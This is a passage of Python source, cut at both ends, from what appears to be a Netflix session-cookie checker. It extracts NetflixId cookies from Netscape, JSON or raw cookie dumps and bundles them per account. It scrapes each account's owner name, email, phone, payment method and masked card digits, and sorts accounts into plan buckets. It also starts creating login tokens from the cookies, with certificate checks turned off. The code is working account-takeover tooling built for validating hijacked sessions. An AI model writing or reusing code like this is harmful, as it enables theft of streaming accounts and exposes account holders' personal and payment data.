    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True


def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }


def format_netscape_cookie_entry(entry):
    return (
        f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
        f"{entry['expires']}\t{entry['name']}\t{entry['value']}"
    )


def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain,
                parts[1],
                parts[2],
                parts[3],
                parts[4],
                name,
                parts[6],
                index,
            )
        )
    return entries


def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []

    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return []

    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain,
                "TRUE" if str(domain).startswith(".") else "FALSE",
                cookie.get("path", "/"),
                "TRUE" if cookie.get("secure", False) else "FALSE",
                cookie.get("expirationDate", cookie.get("expiration", 0)),
                name,
                cookie.get("value", ""),
                index,
            )
        )
    return entries


def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
        r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(
            build_netscape_cookie_entry(
                ".netflix.com",
                "TRUE",
                "/",
                "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
                "0",
                cookie_name,
                value,
                index,
            )
        )
    return entries


def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []

    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    if not entries_by_name:
        return []

    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []

    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])

        if not selected_entries:
            continue

        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append(
            {
                "index": bundle_index + 1,
                "total": bundle_count,
                "netscape_text": netscape_text,
                "cookies": cookies_dict_from_netscape(netscape_text),
            }
        )
    return bundles


def normalize_netscape_cookie_text(raw_text):
    return "\n".join(format_netscape_cookie_entry(entry) for entry in extract_netscape_cookie_entries(raw_text))


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain = parts[0]
            name = canonicalize_netflix_cookie_name(parts[5])
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


def extract_netflix_cookie_text_from_raw(raw_text):
    bundles = build_cookie_bundles_from_entries(extract_raw_cookie_entries(raw_text))
    if not bundles:
        return ""
    return bundles[0]["netscape_text"]


def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


def extract_netflix_cookie_text(content):
    bundles = extract_netflix_cookie_bundles(content)
    if not bundles:
        return ""
    return bundles[0]["netscape_text"]


def _decode_unicode_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def _decode_hex_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {
        "\\x20": " ",
        "\\u00A0": " ",
        "\\u00a0": " ",
        "&nbsp;": " ",
        "u00A0": " ",
    }
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", _decode_unicode_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    # Some scraped values arrive split like "Est u00E1ndar" -> "Est ándar".
    cleaned = re.sub(r"(?<=[A-Za-z])\s+(?=[^\x00-\x7F])", "", cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        if value == 1:
            return True
        if value == 0:
            return False
        return None
    if isinstance(value, dict):
        for key in (
            "value",
            "isUserOnHold",
            "holdStatus",
            "isOnHold",
            "pastDue",
            "isPastDue",
            "isVerified",
            "verified",
        ):
            if key in value:
                parsed = parse_boolean_value(value.get(key))
                if parsed is not None:
                    return parsed
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    truthy = {"true", "yes", "1", "on"}
    falsy = {"false", "no", "0", "off"}
    if lowered in truthy:
        return True
    if lowered in falsy:
        return False
    return None


def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None


def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    parsed = format_boolean_label(value)
    if parsed is not None:
        return parsed
    return value


def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    if not names:
        return None
    return ", ".join(names)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged


def has_complete_account_info(info):
    if not info:
        return False
    required_fields = (
        "countryOfSignup",
        "membershipStatus",
        "localizedPlanName",
        "maxStreams",
        "videoQuality",
    )
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)


def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}

    if not isinstance(payload, dict):
        return {}

    data = payload.get("data")
    if not isinstance(data, dict):
        return {}

    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _first_boolean_label(*candidates):
        for candidate in candidates:
            labeled = format_boolean_label(candidate)
            if labeled is not None:
                return labeled
        return None

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded

        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    hold_status = _first_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta,
        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None,
        hold_meta.get("isOnHold") if isinstance(hold_meta, dict) else None,
        hold_meta.get("pastDue") if isinstance(hold_meta, dict) else None,
        growth_account.get("isUserOnHold"),
        growth_account.get("holdStatus"),
        growth_account.get("isOnHold"),
        growth_account.get("pastDue"),
        growth_account.get("isPastDue"),
    )

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            if re.fullmatch(r"\d{4}", payment_display_text):
                info["maskedCard"] = payment_display_text
            else:
                info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text

    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extra_member_account_patterns = (
        r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
        r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
        r"extra\s+on\s+someone.?else.?s\s+plan",
        r"abbonato\s+extra\s+sul\s+piano\s+di\s+un.?altra\s+persona",
        r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait\s+de\s+quelqu.?un\s+d.?autre",
        r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
    )
    extra_member_by_response_text = any(
        re.search(pattern, response_text, re.IGNORECASE)
        for pattern in extra_member_account_patterns
    )
    if has_complete_account_info(graphql_info):
        # Fast path: GraphQL payload already has core account fields.
        extracted = dict(graphql_info)
    else:
        extracted = {
            "accountOwnerName": extract_first_match(
                response_text,
                [
                    r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                    r'"accountOwnerName"\s*:\s*"([^"]+)"',
                    r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"firstName"\s*:\s*"([^"]+)"',
                ],
            ),
            "email": extract_first_match(
                response_text,
                [
                    r'"emailAddress"\s*:\s*"([^"]+)"',
                    r'"email"\s*:\s*"([^"]+)"',
                    r'"emailAddress"\s*:\s*"([^"]+)"',
                    r'"loginId"\s*:\s*"([^"]+)"',
                ],
            ),
            "countryOfSignup": extract_first_match(
                response_text,
                [
                    r'"currentCountry"\s*:\s*"([^"]+)"',
                    r'"countryOfSignup":\s*"([^"]+)"',
                ],
            ),
            "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
            "nextBillingDate": extract_first_match(
                response_text,
                [
                    r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                    r'"nextBillingDate"\s*:\s*"([^"]+)"',
                    r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                ],
            ),
            "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
            "showExtraMemberSection": extract_bool_value(
                response_text,
                [
                    r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                    r'"showExtraMemberSection"\s*:\s*(true|false)',
                ],
            ),
            "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
            "maxStreams": extract_first_match(
                response_text,
                [
                    r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
                    r'"maxStreams"\s*:\s*"?([^",}]+)"?',
                ],
            ),
            "localizedPlanName": extract_first_match(
                response_text,
                [
                    r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                    r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"localizedPlanName"\s*:\s*"([^"]+)"',
                    r'"planName"\s*:\s*"([^"]+)"',
                ],
            ),
            "planPrice": extract_first_match(
                response_text,
                [
                    r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                    r'"formattedPrice"\s*:\s*"([^"]+)"',
                    r'"planPriceDisplay"\s*:\s*"([^"]+)"',
                    r'"displayPrice"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                    r'"planPrice"[^}]+"value":"([^"]+)"',
                    r'planPrice[^}]+value[^}]+"([^"]+)"',
                    r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*"([^"]+)"',
                ],
            ),
            "paymentMethodExists": extract_bool_value(
                response_text,
                [
                    r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                    r'"paymentMethodExists"\s*:\s*(true|false)',
                ],
            ),
            "paymentMethodType": extract_first_match(
                response_text,
                [
                    r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"paymentMethod"\s*:\s*"([^"]+)"',
                    r'"paymentType"\s*:\s*"([^"]+)"',
                    r'"paymentMethodType"\s*:\s*"([^"]+)"',
                ],
            ),
            "maskedCard": extract_first_match(
                response_text,
                [
                    r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
                    r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                    r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                    r'"paymentMethodLastFour"\s*:\s*"([^"]+)"',
                    r'"lastFour"\s*:\s*"([^"]+)"',
                    r'"creditCardLast4"\s*:\s*"([^"]+)"',
                    r'"creditCardEndingDigits"\s*:\s*"([^"]+)"',
                    r'"paymentMethodDescription"\s*:\s*"([^"]+)"',
                    r'"maskedCard"\s*:\s*"([^"]+)"',
                    r'"cardNumber"\s*:\s*"([^"]+)"',
                ],
            ),
            "phoneNumber": extract_first_match(
                response_text,
                [
                    r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                    r'"phoneNumber"\s*:\s*"([^"]+)"',
                    r'"mobilePhone"\s*:\s*"([^"]+)"',
                ],
            ),
            "phoneVerified": extract_bool_value(
                response_text,
                [
                    r'"phoneVerified"\s*:\s*(true|false)',
                    r'"isPhoneVerified"\s*:\s*(true|false)',
                ],
            ),
            "videoQuality": extract_first_match(
                response_text,
                [
                    r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"videoQuality"\s*:\s*"([^"]+)"',
                    r'"quality"\s*:\s*"([^"]+)"',
                ],
            ),
            "holdStatus": extract_bool_value(
                response_text,
                [
                    r'"holdStatus"\s*:\s*(true|false)',
                    r'"holdStatus"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                    r'"isUserOnHold"\s*:\s*(true|false)',
                    r'"isUserOnHold"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                    r'"isOnHold"\s*:\s*(true|false)',
                    r'"pastDue"\s*:\s*(true|false)',
                    r'"isPastDue"\s*:\s*(true|false)',
                ],
            ),
            "emailVerified": extract_bool_value(
                response_text,
                [
                    r'"emailVerified"\s*:\s*(true|false)',
                    r'"isEmailVerified"\s*:\s*(true|false)',
                    r'"emailAddressVerified"\s*:\s*(true|false)',
                    r'"contactEmailVerified"\s*:\s*(true|false)',
                ],
            ),
            "profiles": extract_profile_names(response_text),
        }

        extracted = merge_info(graphql_info, extracted)

    extracted.setdefault("paymentMethodType", None)
    extracted.setdefault("paymentMethodExists", None)
    extracted.setdefault("maskedCard", None)
    extracted.setdefault("holdStatus", None)
    extracted.setdefault("emailVerified", None)
    extracted.setdefault("phoneNumber", None)
    extracted.setdefault("countryOfSignup", None)
    extracted.setdefault("membershipStatus", None)
    extracted.setdefault("localizedPlanName", None)

    if extra_member_by_response_text:
        extracted["isExtraMemberAccount"] = "Yes"

    extracted["localizedPlanName"] = (
        extracted["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
        if extracted["localizedPlanName"]
        else None
    )

    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = extracted["paymentMethodExists"]

    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"

    if extracted["holdStatus"] is None:
        membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
        if membership_status_key == "current_member":
            extracted["holdStatus"] = "No"
        elif any(token in membership_status_key for token in ("hold", "past_due", "payment_retry", "paused", "suspend")):
            extracted["holdStatus"] = "Yes"

    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"

    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))

    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None

    return extracted


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def format_plan_label(plan_key):
    if not plan_key:
        return "Unknown"
    label = plan_key.replace("_", " ").strip()
    return label.title() if label else "Unknown"


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None


def derive_plan_info(info, is_subscribed): # https[:]//hars hitkamboj.in
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {
            "premium",
            "premium_extra_member",
            "extra_member_premium",
            "cao_cap",
            "cao_cap_plan",
            "cao_c_ap",
            "cao_c_p",
            "caocap",
            "高級",
            "高級方案",
            "高级",
            "高級方案_額外成員",
            "高级_额外成员",
            "ozel",
            "المميزة",
            "พรีเมียม",
            "พร_เม_ยม",
            "프리미엄",
            "프리미엄",
            "プレミアム",
            "פרימיום",
            "πριμιουμ",
            "premium_plan",
        },
        "standard_with_ads": {
            "standard_with_ads",
            "standardwithads",
            "estandar_con_anuncios",
            "estandarconanuncios",
            "padrao_com_anuncios",
            "padrao_com_publicidade",
            "padrao_com_anuncios",
            "광고형_스탠다드",
            "광고형_스탠다드",
            "광고형_표준",
            "standard_with_adverts",
            "standard_avec_pub",
            "standard_avec_publicite",
            "standard_con_pubblicita",
            "standard_abo_mit_werbung",
            "الخطة_القياسية_مع_اعلانات",
            "standardowy_z_reklamami",
            "τυπικο_με_διαφημισεις",
            "standaard_met_reclame",
            "standaard_met_advertenties",
            "広告付きスタンダード",
            "附广告标准",
            "附廣告標準",
        },
        "standard": {
            "standard",
            "estandar",
            "est_andar",
            "estandar_plan",
            "標準方案",
            "标准",
            "標準方案_額外成員",
            "标准_额外成员",
            "standardowy",
            "padrao",
            "standart",
            "standar",
            "tieuchuan",
            "tieu_chuan",
            "標準",
            "มาตรฐาน",
            "스탠다드",
            "스탠다드",
            "スタンダード",
            "τυπικο",
            "standardni",
            "standaard",
            "القياسية",
            "סטנדרטית",
            "norma",
        },
        "basic": {
            "basic",
            "basic_with_ads",
            "basico",
            "dasar",
            "dasar_paket",
            "basico_con_anuncios",
            "basique",
            "basis",
            "βασικο",
            "基本",
            "基本方案",
            "베이직",
            "ベーシック",
            "temel",
            "พื้นฐาน",
            "พ_นฐาน",
            "podstawowy",
            "الاساسية",
            "בסיסית",
            "osnovni",
            "alap",
            "dasar",
            "base",
            "essentiel",
            "asas",
            "co_ban",
            "basico_com_anuncios",
            "basico_com_publicidade",
        },
        "mobile": {
            "ponsel",
            "mobile",
            "seluler",
            "movil",
            "มือถือ",
            "모바일",
            "モバイル",
        },
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False

    explicit_flag = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit_flag:
        lowered_flag = explicit_flag.strip().lower()
        if lowered_flag in {"yes", "true", "1"}:
            return True
        if lowered_flag in {"no", "false", "0"}:
            return False

    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    membership_status = decode_netflix_value(info.get("membershipStatus")) or ""

    candidates = [localized_plan, membership_status]
    markers_text = (
        "extra member",
        "miembro extra",
        "suscriptor extra",
        "suscriptor adicional",
        "membro extra",
        "assinante extra",
        "abbonato extra",
        "abonne supplementaire",
        "abonné supplémentaire",
        "abonent extra",
        "abonado extra",
        "ekstra uye",
        "ekstra üye",
        "extra abonnee",
        "extra abonent",
        "membro extra",
        "membre supplementaire",
        "membre supplémentaire",
        "额外成员",
        "額外成員",
        "추가 회원",
        "추가회원",
    )
    markers_normalized = (
        "extra_member",
        "miembro_extra",
        "suscriptor_extra",
        "suscriptor_adicional",
        "abonado_extra",
        "membro_extra",
        "assinante_extra",
        "abbonato_extra",
        "abonne_supplementaire",
        "abonent_extra",
        "ekstra_uye",
        "extra_abonnee",
        "membre_supplementaire",
        "额外成员",
        "額外成員",
        "추가_회원",
        "추가회원",
    )

    for value in candidates:
        if not value:
            continue
        lowered = value.lower()
        normalized = normalize_plan_key(value)
        normalized_spaced = normalized.replace("_", " ")
        if any(marker in lowered for marker in markers_text):
            return True
        if any(marker in normalized for marker in markers_normalized):
            return True
        if "extra member" in normalized_spaced:
            return True
    return False


def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    return is_extra_member_account(info)


def is_on_hold_account(info):
    hold_value = format_boolean_label((info or {}).get("holdStatus"))
    if hold_value is not None:
        return hold_value == "Yes"

    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
    return any(
        token in membership_status
        for token in ("hold", "past_due", "payment_retry", "paused", "suspend")
    )


def derive_output_plan_bucket(info, is_subscribed):
    plan_key, plan_name = derive_plan_info(info, is_subscribed)
    folder_label = get_canonical_output_label(plan_key)
    display_label = plan_name or folder_label

    if is_subscribed and is_extra_member_account(info):
        # Extra-member accounts are treated as Premium-only bucket.
        extra_plan_key = "extra_member_premium"
        extra_label = get_canonical_output_label(extra_plan_key)
        if extra_label == "Unknown":
            extra_label = f"{folder_label} (Extra Member)"
        return extra_plan_key, extra_label, extra_label

    return plan_key, folder_label, display_label


def generate_unknown_guid():
    return f"unknown{random.randint(10000000, 99999999)}"


def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, "Missing required cookies for NFToken"

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        attempts = max(1, int(attempts))
    except Exception:
        attempts = 1

    last_error = "NFToken API error"
    for _ in range(attempts):
        try:
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                verify=False,
            )
            if response.status_code != 200:
                if response.status_code == 403:
                    last_error = "403"
                elif response.status_code == 429:
                    last_error = "429"
                else:
                    last_error = "NFToken API error"
                continue

            data = response.json()
            token_data = (
